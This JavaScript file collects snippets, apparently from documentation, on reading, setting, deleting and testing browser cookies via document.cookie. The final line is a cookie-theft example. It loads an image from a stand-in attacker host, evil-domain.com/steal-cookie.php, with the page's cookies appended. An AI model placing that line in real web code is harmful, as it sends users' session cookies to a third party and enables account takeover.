document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
}

document.cookie = "test1=Hello";
document.cookie = "test2=World";

var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, "$1");

function alertCookieValue() {
  alert(cookieValue);
}

function doOnce() {
  if (document.cookie.replace(/(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
    alert("Do something here!");
    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
  }
}

function resetOnce() {
  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
}

//ES5

if (document.cookie.split(';').filter(function(item) {
    return item.trim().indexOf('reader=') == 0
}).length) {
    console.log('The cookie "reader" exists (ES5)')
}

//ES2016

if (document.cookie.split(';').filter((item) => item.trim().startsWith('reader=')).length) {
    console.log('The cookie "reader" exists (ES6)')
}

//ES5

if (document.cookie.split(';').filter(function(item) {
    return item.indexOf('reader=1') >= 0
}).length) {
    console.log('The cookie "reader" has "1" for value')
}

//ES2016

if (document.cookie.split(';').filter((item) => item.includes('reader=1')).length) {
    console.log('The cookie "reader" has "1" for value')
}

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
